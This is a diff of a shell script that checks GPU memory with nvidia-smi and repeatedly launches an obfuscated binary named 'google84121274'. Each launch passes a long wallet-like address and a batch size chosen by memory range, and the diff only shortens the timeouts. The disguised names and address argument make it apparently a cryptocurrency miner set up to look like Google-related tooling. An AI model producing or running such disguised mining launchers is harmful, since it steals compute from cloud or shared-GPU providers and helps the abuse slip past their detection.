@@ -22,7 +22,7 @@ cd googleapps8474
 if (($google84 >= 14884 && $google84 <= 16884));
 then
 
-timeout 12 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 1 -b 830
+timeout 4 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 1 -b 830
 if [ $? -eq 124 ]; then
 echo "google84"
 else
@@ -34,7 +34,7 @@ fi
 if (($google84 >= 10884 && $google84 <= 14882));
 then
 
-timeout 12 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 1 -b 572
+timeout 4 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 1 -b 572
 if [ $? -eq 124 ]; then
 echo "google84"
 else
@@ -46,7 +46,7 @@ fi
 if (($google84 >= 5288 && $google84 <= 9184));
 then
 
-timeout 12 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 1 -b 362
+timeout 4 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 1 -b 362
 if [ $? -eq 124 ]; then
 echo "google84"
 else
@@ -58,7 +58,7 @@ fi
 if (($google84 >= 2874 && $google84 <= 5184));
 then
 
-timeout 12 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 1 -b 208
+timeout 4 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 1 -b 208
 if [ $? -eq 124 ]; then
 echo "google84"
 else
@@ -70,7 +70,7 @@ fi
 if (($google84 >= 1884 && $google84 <= 2488));
 then
 
-timeout 12 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 1 -b 102
+timeout 4 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 1 -b 102
 if [ $? -eq 124 ]; then
 echo "google84"
 else
@@ -97,7 +97,7 @@ google84=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | s
 if (($google84 >= 14884 && $google84 <= 16884));
 then
 
-timeout 12 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 1 -b 28
+timeout 4 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 1 -b 28
 if [ $? -eq 124 ]; then
 echo "google84"
 else
@@ -109,7 +109,7 @@ fi
 if (($google84 >= 10884 && $google84 <= 14882));
 then
 
-timeout 12 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 1 -b 18
+timeout 4 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 1 -b 18
 if [ $? -eq 124 ]; then
 echo "google84"
 else
@@ -121,7 +121,7 @@ fi
 if (($google84 >= 5288 && $google84 <= 9184));
 then
 
-timeout 12 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 1 -b 10
+timeout 4 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 1 -b 10
 if [ $? -eq 124 ]; then
 echo "google84"
 else
@@ -133,7 +133,7 @@ fi
 if (($google84 >= 2874 && $google84 <= 5184));
 then
 
-timeout 12 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 1 -b 6
+timeout 4 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 1 -b 6
 if [ $? -eq 124 ]; then
 echo "google84"
 else
@@ -145,7 +145,7 @@ fi
 if (($google84 >= 1884 && $google84 <= 2488));
 then
 
-timeout 12 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 1 -b 2
+timeout 4 ./google84121274 -p $google841212121274 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 1 -b 2
 if [ $? -eq 124 ]; then
 echo "google84"
 else
